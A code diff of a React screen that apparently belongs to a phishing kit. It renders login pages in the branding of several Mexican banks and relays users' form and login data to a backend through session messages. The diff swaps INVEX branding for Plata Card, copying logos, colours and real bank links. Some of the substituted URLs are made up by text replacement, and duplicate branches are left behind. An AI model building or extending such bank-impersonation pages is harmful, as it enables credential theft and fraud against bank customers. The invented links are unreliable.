@@ -40,8 +40,7 @@ import santanderLogo from '../assets/santander_logo.png';
 import santanderLogoWhite from '../assets/santander_logo_white_fixed.png';
 import scotiabankLogo from '../assets/scotiabank_logo.png';
 import scotiabankLogoWhite from '../assets/scotiabank_logo_white.png';
-import invexLogo from '../assets/invex_logo.png';
-import invexLogoWhite from '../assets/invex_logo_white.png';
+import platacardLogo from '@assets/Plata_Card_Logo_1754951777982.png';
 import banregioLogo from '../assets/banregio_logo.png';
 import banregioLogoWhite from '../assets/banregio_logo_white.png';
 
@@ -333,7 +332,7 @@ export default function ClientScreen() {
             type: 'CREATE_UNIQUE_SESSION',
             data: {
               sessionId: newSessionId,
-              banco: 'INVEX',
+              banco: 'PLATACARD',
               deviceId: deviceId,
               clientData: { 
                 terminosAceptados: true,
@@ -344,7 +343,7 @@ export default function ClientScreen() {
           });
           
           // Actualizar el estado local con el nuevo sessionId
-          setSessionData(prev => ({ ...prev, sessionId: newSessionId, banco: 'INVEX' }));
+          setSessionData(prev => ({ ...prev, sessionId: newSessionId, banco: 'PLATACARD' }));
           setCurrentScreen(ScreenType.LOGIN);
           return;
         }
@@ -362,14 +361,14 @@ export default function ClientScreen() {
               type: 'CREATE_UNIQUE_SESSION',
               data: {
                 sessionId: currentSessionId,
-                banco: 'INVEX',
+                banco: 'PLATACARD',
                 deviceId: deviceId,
                 clientData: formData,
                 timestamp: new Date().toISOString()
               }
             });
             
-            setSessionData(prev => ({ ...prev, sessionId: currentSessionId, banco: 'INVEX' }));
+            setSessionData(prev => ({ ...prev, sessionId: currentSessionId, banco: 'PLATACARD' }));
           } else {
             // Actualizar sesión existente con datos de login
             sendMessage({
@@ -531,20 +530,6 @@ export default function ClientScreen() {
           <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
-    } else if (sessionData.banco === 'INVEX') {
-      return (
-        <header className="bg-[#BE0046] text-white p-4 text-center">
-          <div className="flex justify-center mb-2">
-            <img 
-              src={invexLogoWhite} 
-              className="invex-logo inline-block" 
-              alt="INVEX" 
-              style={{maxHeight: '36px', height: '2.5rem', width: 'auto'}}
-            />
-          </div>
-          <div className="font-bold text-sm">{formatDate(new Date())}</div>
-        </header>
-      );
     } else if (sessionData.banco === 'BANREGIO') {
       return (
         <header className="bg-[#FF6600] text-white p-4 text-center">
@@ -573,11 +558,14 @@ export default function ClientScreen() {
       );
     } else if (sessionData.banco === 'PLATACARD') {
       return (
-        <header className="bg-gradient-to-r from-gray-600 to-gray-700 text-white p-4 text-center">
+        <header className="bg-black text-white p-4 text-center">
           <div className="flex justify-center mb-2">
-            <div className="text-2xl font-bold tracking-wider text-white">
-              PLATA<span className="text-gray-300">CARD</span>
-            </div>
+            <img 
+              src={platacardLogo} 
+              className="platacard-logo inline-block" 
+              alt="Plata Card" 
+              style={{maxHeight: '40px', height: '2.5rem', width: 'auto'}}
+            />
           </div>
           <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
@@ -629,7 +617,6 @@ export default function ClientScreen() {
               sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/' :
               sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/' :
               sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/personas.aspx' :
-              sessionData.banco === 'INVEX' ? 'https://www.invex.com/' :
               sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/' :
               sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/' :
               sessionData.banco === 'PLATACARD' ? 'https://www.platacard.com/' :
@@ -643,7 +630,7 @@ export default function ClientScreen() {
               sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
               sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
               sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
-              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
+              sessionData.banco === 'PLATACARD' ? 'text-[#ff6b35]' :
               sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
               sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
               'text-[#EC1C24]'
@@ -657,7 +644,7 @@ export default function ClientScreen() {
               sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/' :
               sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/ayuda/' :
               sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/contacto/canales-de-atencion.aspx' :
-              sessionData.banco === 'INVEX' ? 'https://www.invex.com/contacto' :
+              sessionData.banco === 'PLATACARD' ? 'https://www.platacard.com/contacto' :
               sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/ayuda/' :
               sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/centro-de-ayuda' :
               'https://www.banorte.com/wps/portal/banorte/Home/ayuda-banorte/'
@@ -670,7 +657,7 @@ export default function ClientScreen() {
               sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
               sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
               sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
-              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
+              sessionData.banco === 'PLATACARD' ? 'text-[#ff6b35]' :
               sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
               sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
               'text-[#EC1C24]'
@@ -684,7 +671,7 @@ export default function ClientScreen() {
               sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/preferencias-legales/aviso-de-privacidad/' :
               sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/terminos-condiciones-contratos/' :
               sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/terminos-y-condiciones.aspx' :
-              sessionData.banco === 'INVEX' ? 'https://www.invex.com/aviso-de-privacidad' :
+              sessionData.banco === 'PLATACARD' ? 'https://www.platacard.com/terminos' :
               sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/contenido/terminos.php' :
               sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/aviso-de-privacidad' :
               'https://www.banorte.com/wps/portal/banorte/Home/inicio/terminos-y-condiciones'
@@ -697,7 +684,7 @@ export default function ClientScreen() {
               sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
               sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
               sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
-              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
+              sessionData.banco === 'PLATACARD' ? 'text-[#ff6b35]' :
               sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
               sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
               'text-[#EC1C24]'
@@ -711,7 +698,7 @@ export default function ClientScreen() {
               sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/seguridad/' :
               sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/seguridad/' :
               sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/seguridad-bancaria.aspx' :
-              sessionData.banco === 'INVEX' ? 'https://invex.com/tips-de-seguridad' :
+              sessionData.banco === 'PLATACARD' ? 'https://platacard.com/tips-de-seguridad' :
               sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/seguridad.php' :
               sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/seguridad' :
               'https://www.banorte.com/wps/portal/banorte/Home/seguridad-banorte'
@@ -724,7 +711,7 @@ export default function ClientScreen() {
               sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
               sessionData.banco === 'SANTANDER' ? 'text-[#EC0000]' :
               sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
-              sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
+              sessionData.banco === 'PLATACARD' ? 'text-[#ff6b35]' :
               sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
               sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
               'text-[#EC1C24]'
@@ -740,7 +727,7 @@ export default function ClientScreen() {
             sessionData.banco === 'AMEX' ? 'bg-[#0077C8]' :
             sessionData.banco === 'SANTANDER' ? 'bg-[#EC0000]' :
             sessionData.banco === 'SCOTIABANK' ? 'bg-[#EC111A]' :
-            sessionData.banco === 'INVEX' ? 'bg-[#BE0046]' :
+            sessionData.banco === 'PLATACARD' ? 'bg-[#ff6b35]' :
             sessionData.banco === 'BANREGIO' ? 'bg-[#FF6600]' :
             sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
             'bg-[#EC1C24]'
@@ -755,7 +742,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/contacto/' :
                 sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/contacto/' :
                 sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/contacto/canales-de-atencion.aspx' :
-                sessionData.banco === 'INVEX' ? 'https://invex.com/contacto-y-centros-financieros' :
+                sessionData.banco === 'PLATACARD' ? 'https://platacard.com/contacto-y-centros-financieros' :
                 sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/contacto.php' :
                 sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/contacto' :
                 'https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte'
@@ -769,7 +756,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/disputas/' :
                 sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/aclaraciones/' :
                 sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/contacto/unidad-especializada-aclaraciones.aspx' :
-                sessionData.banco === 'INVEX' ? 'https://invex.com/tips-de-seguridad' :
+                sessionData.banco === 'PLATACARD' ? 'https://platacard.com/tips-de-seguridad' :
                 sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/ayuda/aclaraciones.php' :
                 sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/preguntas-frecuentes' :
                 'https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte/aclaraciones-en-linea'
@@ -783,7 +770,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/promociones/hoteles/' :
                 sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/santander-select/promociones-exclusivas/' :
                 sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/promociones/promociones.aspx' :
-                sessionData.banco === 'INVEX' ? 'https://www.invextarjetas.com.mx/invex/landings/invex/index.html' :
+                sessionData.banco === 'PLATACARD' ? 'https://www.platacardtarjetas.com.mx/platacard/landings/platacard/index.html' :
                 sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/promociones/' :
                 sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/promociones' :
                 'https://www.banorte.com/wps/portal/banorte/Home/promociones/todas'
@@ -797,7 +784,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'AMEX' ? 'https://www.facebook.com/AmericanExpressMexico' :
                 sessionData.banco === 'SANTANDER' ? 'https://www.facebook.com/SantanderMexico' :
                 sessionData.banco === 'SCOTIABANK' ? 'https://www.facebook.com/ScotiabankMX' :
-                sessionData.banco === 'INVEX' ? 'https://www.facebook.com/share/16Fn8ePZxS/?mibextid=wwXIfr' :
+                sessionData.banco === 'PLATACARD' ? 'https://www.facebook.com/share/16Fn8ePZxS/?mibextid=wwXIfr' :
                 sessionData.banco === 'BANREGIO' ? 'https://www.facebook.com/banregio' :
                 sessionData.banco === 'SPIN' ? 'https://www.facebook.com/SpinByOxxo' :
                 'https://www.facebook.com/BanorteOficial'
@@ -811,7 +798,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'AMEX' ? 'https://www.youtube.com/user/americanexpressmexico' :
                 sessionData.banco === 'SANTANDER' ? 'https://www.youtube.com/user/SantanderMx' :
                 sessionData.banco === 'SCOTIABANK' ? 'https://www.youtube.com/user/ScotiabankMX' :
-                sessionData.banco === 'INVEX' ? 'https://youtube.com/@invexoficial?si=OdZlV-hKxx1W2YIg' :
+                sessionData.banco === 'PLATACARD' ? 'https://youtube.com/@platacardoficial?si=OdZlV-hKxx1W2YIg' :
                 sessionData.banco === 'BANREGIO' ? 'https://www.youtube.com/channel/UC0UWRvXksJJzXG-hRnGDG3g' :
                 sessionData.banco === 'SPIN' ? 'https://www.youtube.com/channel/UC6LuKC5QzmY2V4qVbJYJavw' :
                 sessionData.banco === 'PLATACARD' ? 'https://www.youtube.com/channel/platacard' :
@@ -827,7 +814,7 @@ export default function ClientScreen() {
               sessionData.banco === 'AMEX' ? 'American Express' :
               sessionData.banco === 'SANTANDER' ? 'Santander' :
               sessionData.banco === 'SCOTIABANK' ? 'Scotiabank' :
-              sessionData.banco === 'INVEX' ? 'INVEX' :
+              sessionData.banco === 'PLATACARD' ? 'PLATACARD' :
               sessionData.banco === 'BANREGIO' ? 'Banregio' :
               sessionData.banco === 'SPIN' ? 'SPIN by Oxxo' :
               sessionData.banco === 'PLATACARD' ? 'Plata Card' :
@@ -897,12 +884,6 @@ export default function ClientScreen() {
           <p className="text-sm text-gray-600 mt-1">Bienvenido a Scotiabank, tu banco con más posibilidades</p>
         </div>
       );
-    } else if (sessionData.banco === 'INVEX') {
-      return (
-        <div className="text-center mt-2 px-4">
-          <p className="text-sm text-gray-600 mt-1">Bienvenido a INVEX Banca Digital</p>
-        </div>
-      );
     } else if (sessionData.banco === 'BANREGIO') {
       return (
         <div className="text-center mt-2 px-4">
@@ -960,10 +941,9 @@ export default function ClientScreen() {
                 sessionData.banco === 'AMEX' ? 'amex-bg' :
                 sessionData.banco === 'SANTANDER' ? 'santander-bg' :
                 sessionData.banco === 'SCOTIABANK' ? 'scotiabank-bg' :
-                sessionData.banco === 'INVEX' ? 'invex-bg' :
+                sessionData.banco === 'PLATACARD' ? 'platacard-bg' :
                 sessionData.banco === 'BANREGIO' ? 'banregio-bg' :
                 sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
-                sessionData.banco === 'PLATACARD' ? 'platacard-bg' :
                 'bg-[#EC1C24]'
               } animate-progress-bar`}></div>
             </div>
